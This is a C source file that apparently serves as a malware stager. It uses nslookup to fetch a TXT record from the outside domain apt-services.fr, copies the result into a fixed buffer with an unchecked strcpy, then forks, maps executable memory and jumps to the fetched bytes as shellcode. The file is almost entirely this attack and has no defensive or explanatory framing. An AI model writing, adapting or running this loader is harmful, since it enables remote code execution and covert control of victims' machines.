
#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>


int sys_bineval(char *argv);

int main(int argc, char *argv[])
{
        FILE * f = popen( "nslookup -querytype=TXT apt-services.fr | grep text | cut -d \" \" -f3- | tr -d \"\\\"\"", "r" );
        if ( f == 0 ) {
            fprintf( stderr, "Could not execute\n" );
            return 1;
        }
        const int BUFSIZE = 1000;
        char buf[ BUFSIZE ];
        char payload[200];
        while( fgets( buf, BUFSIZE,  f ) ) {
        fprintf( stdout, "%s", buf  );
        strcpy(payload, buf);
        }
        pclose( f );
	sys_bineval(payload);
	exit(0);
}

int sys_bineval(char *argv)
{
	size_t len;


	int *addr;
	size_t page_size;
	pid_t pID;
	len = (size_t)strlen(argv);
	
	pID = fork();
	if(pID<0)
		return 1;

	if(pID==0)
	{
		page_size = (size_t)sysconf(_SC_PAGESIZE)-1;	// get page size
		page_size = (len+page_size) & ~(page_size);	// align to page boundary

		// mmap an +rwx memory page
		addr = mmap(0, page_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANON, 0, 0);

		if (addr == MAP_FAILED)
			return 1;

		// copy over the shellcode
		strncpy((char *)addr, argv, len);

		// execute it
		((void (*)(void))addr)();
	}

	if(pID>0)
		waitpid(pID, 0, WNOHANG);


	return 0;
}


